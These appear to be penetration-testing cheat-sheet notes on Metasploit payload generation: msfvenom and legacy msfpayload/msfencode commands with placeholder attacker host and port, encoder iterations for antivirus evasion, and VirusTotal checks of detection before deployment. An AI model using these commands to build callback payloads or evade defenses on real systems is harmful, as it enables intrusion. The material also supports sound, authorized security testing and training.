## Modern Payload Generation and Encoding

Payload fails to execute due to **bad characters** or architecture mismatch. Requires `msfvenom` for unified generation and encoding,.

Generate payload with automatic encoder selection to strip bad characters

```
msfvenom -a <ARCH> --platform <PLATFORM> -p <PAYLOAD> LHOST=<ATTACK_IP> LPORT=<PORT> -b "<BAD_CHARS>" -f <FORMAT>
```

Force a specific encoder and set multiple iterations to attempt signature obfuscation

```
msfvenom -a <ARCH> --platform <PLATFORM> -p <PAYLOAD> LHOST=<ATTACK_IP> LPORT=<PORT> -e <ENCODER> -i <ITERATIONS> -f <FORMAT> -o <FILE_PATH>
```

- **Dangerous / misconfigured settings**
    
    - Using **Shikata Ga Nai** for modern AV evasion — modern detection methods easily identify these signatures despite polymorphic XOR mechanisms,.
    - Writing output to restricted directories like `/root/Desktop/` without adequate permissions.
- **Gotchas**
    
    - **Permission denied** errors will trigger if the output path is restricted.
    - Standard encoding is often **detected by most antivirus products** regardless of iteration count,.

---

## In-Framework Encoder Selection

Exploit module requires specific encoding to bypass character restrictions within the target service. Active exploit and payload must be set in `msfconsole` first.

View only encoders compatible with the currently selected exploit and payload

```
show encoders
```

- **Gotchas**
    - The list is **automatically filtered** based on compatibility; if no encoders appear, the selected module/payload combination may not support them.

---

## Legacy MSF Encoding (Pre-2015)

Environment is running Metasploit Framework v2 or legacy submodules are required. Tools are typically found in `/usr/share/framework2/`.

Pipe raw payload output into the encoder for architecture compatibility

```
msfpayload <PAYLOAD> LHOST=<ATTACK_IP> LPORT=<PORT> R | msfencode -b '<BAD_CHARS>' -f <FORMAT> -e <ENCODER>
```

- **Tool comparison**
    - msfvenom -> Combined tool -> Prefer for all modern engagements.
    - msfpayload/msfencode -> Separate submodules -> Only used in legacy framework versions.

---

## Payload Analysis and AV Verification

Verification of payload stealth is required before deployment. Requires a valid VirusTotal API key.

Upload and scan a generated executable for detection rates

```
msf-virustotal -k <API_KEY> -f <FILE_PATH>
```

- **Edge cases**
    
    - A **code -2** response indicates the scan is still queued and requires waiting for the report to generate.
- **Gotchas**
    
    - Scanning payloads on public services like VirusTotal **reveals the signature** to vendors, potentially burning the exploit for future use.